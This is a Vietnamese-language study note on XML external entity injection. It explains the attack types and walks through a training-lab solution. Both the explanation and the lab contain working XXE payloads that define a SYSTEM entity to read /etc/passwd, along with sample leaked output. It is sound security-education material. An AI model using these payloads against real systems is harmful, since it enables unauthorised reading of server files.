# XXE

## Khái niệm:

> XXE (XML external entity injection) là 1 vul web cho phép `attacker` tấn công, can thiệp vào quá trình xử lí `xml data`.
>
> Nó cho phép `attacker` xem các file trên `system` và tương tác với chúng, thực hiện `SSRF`, `Access Control Bypass` kết hợp với `RCE`, ...
> ![img](https://truongtn.files.wordpress.com/2021/06/xxe.png)

## Làm thế nào để XXE phát sinh

> Một số ứng dụng dùng `XMl` để truyền data giữa `Browser` và `Server`. Các ứng dụng thực hiện đều này hầu như luôn sử dụng `lib` hoặc `API` để xử lý `XML` trên `Server`.
>
> Các vul `XXE` phát sinh do đặc tả của `XML` chứa nhiều tính năng nguy hiểm tiềm ẩn khác nhau.

## Các loại XXE attack:

> - Khai thác `XXE` để truy xuất file (Exploiting XXE to retrieve files): Trong 1 thực thể bên ngoài được xác định có chứa content của file, và được trả về trong phản hồi của ứng dụng
> - Khai thác `XXE` để thực hiện `SSRF` (Exploiting XXE to perform SSRF attacks): Nơi mà `entity` bên ngoài được xác định dựa trên `URL` đến hệ thống `back-end`
> - Khai thác `Blind XXE` `out-of-band` (Exploiting blind XXE exfiltrate data out-of-band): Nơi data nhạy cảm được truyền từ `server` tới hệ thống mà `attacker` kiểm soát
> - Khai thác `blind XXE` để truy xuất dữ liệu qua thông báo lỗi (Exploiting blind XXE to retrieve data via error messages): Nơi mà `attacker` có thể kích hoạt thông báo lỗi phân tích cú pháp dữ liệu `sensitive`

## Hậu quả:

> `attacker` có thể lấy được dữ liệu của hệ thống, ngoài ra kẻ tấn công còn truy cập tới các ứng dụng, thiết bị phụ trợ mà ứng dụng này được phép truy cập...

## Exploiting XXE to retrieve files (Khai thác XXE để truy xuất file)

> Để khai thác được lỗi này, có 2 cách để sửa `XML` đã gửi:
>
> - Sửa phần từ `DOCTYPE` xác định một thực thể bên ngoài chứa đường dẫn tới tệp
> - Chỉnh sửa giá trị trong `XML` được trả về trong `response` của app để sử dụng thực thể bên ngoài đã xác định

> Ví dụ một ứng dụng mua sắm kiểm tra mức độ còn sản phẩm của ứng dụng bằng cách gửi `XML` lên máy chủ:
>
> ```
> <?xml version="1.0" encoding="UTF-8"?>
> <stockCheck><productId>381</productId></stockCheck>
> ```

> Ứng dụng đã không triển khai bất kì hình thức nào để chống `XXE` vì vậy có thể `exploit` để truy xuất `/etc/passwd` file bằng cách gửi `payloads` sau:
>
> ```
> <?xml version="1.0" encoding="UTF-8"?>
> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
> <stockCheck><productId>&xxe;</productId></stockCheck>
> ```

> `payload` này xác định thực thể bên ngoài `&xxe` có giá trị là content của tệp `/etc/passwd` và sử dụng trong thực thể `productId`. Điều này khiến app trả về:
>
> ```
> Invalid product ID: root:x:0:0:root:/root:/bin/bash
> daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
> bin:x:2:2:bin:/bin:/usr/sbin/nologin
> ...
> ```

#### Lab: Exploiting XXE using external entities to retrieve files

> Tag: Apprentice
>
> Des: Lab này chứa tính năng `check stock` phân tích cú pháp `input XML` và trả về `value` không mong muốn. Để `solve` thì hãy đưa 1 thực thể bên ngoài và truy xuất content của `/etc/passwd`

**Giao diện ban đầu**

> ![img](../asset/xxe-Exploiting-XXE-using-external-entities-to-retrieve-files-0.png)

> Dùng `Burp` chặn `request` chỗ `check stock`, lúc đầu sẽ như này:
> ![img](../asset/xxe-Exploiting-XXE-using-external-entities-to-retrieve-files-1.png)

> Sửa đoạn `XML`:
>
> ```
> <?xml version="1.0" encoding="UTF-8"?>
>
> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
>
> <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
> ```

> Trả về:
> ![img](../asset/xxe-Exploiting-XXE-using-external-entities-to-retrieve-files-2.png)

> DONE:
> ![img](../asset/xxe-Exploiting-XXE-using-external-entities-to-retrieve-files-3.png)
